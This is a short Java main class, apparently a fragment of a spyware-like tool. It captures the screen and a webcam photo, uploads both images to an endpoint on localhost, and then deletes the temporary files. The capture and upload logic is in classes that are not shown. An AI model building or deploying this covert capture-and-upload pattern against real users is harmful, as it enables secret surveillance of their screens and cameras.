public class LLW {
	public static void main(String args[]) {
		System.out.println("[+] Program booted up.");
		PhotoCapture pc = new PhotoCapture();
		pc.takeScreenShot();
		pc.takeCameraShot();
		PostCreator a = new PostCreator("http://127.0.0.1:5000/upload","./tempscreenshot.png","./tempcamerashot.png");
		a.send();
		a.cleanup();
	}
}
